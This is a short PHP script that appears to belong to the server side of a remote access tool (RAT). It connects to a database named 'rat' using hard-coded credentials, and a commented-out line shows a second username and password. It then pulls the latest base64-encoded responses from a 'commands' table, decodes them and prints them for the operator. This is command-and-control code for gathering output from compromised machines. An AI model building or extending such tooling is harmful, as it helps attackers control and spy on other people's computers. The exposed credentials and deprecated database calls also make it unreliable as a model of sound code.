<?php

//mysql_connect("localhost", "nzbkpavw_rat", "pq97r") or die(mysql_error());
//mysql_select_db("nzbkpavw_rat") or die(mysql_error());
mysql_connect("localhost", "admin", "pq97r") or die(mysql_error());
mysql_select_db("rat") or die(mysql_error());

$result = mysql_query("SELECT response FROM commands WHERE response != '' ORDER BY ID DESC LIMIT 10");
$echo = "";
while ($data = mysql_fetch_array($result)) {
	$response = base64_decode($data['response']);
	$response= str_replace("\\\\", "#$*BACKSLASH*$#", $response);
	$response = str_replace("\\", "", $response);
	$response = str_replace("#$*BACKSLASH*$#", "\\", $response);
	$echo = $response.$echo;
}

echo $echo;
?>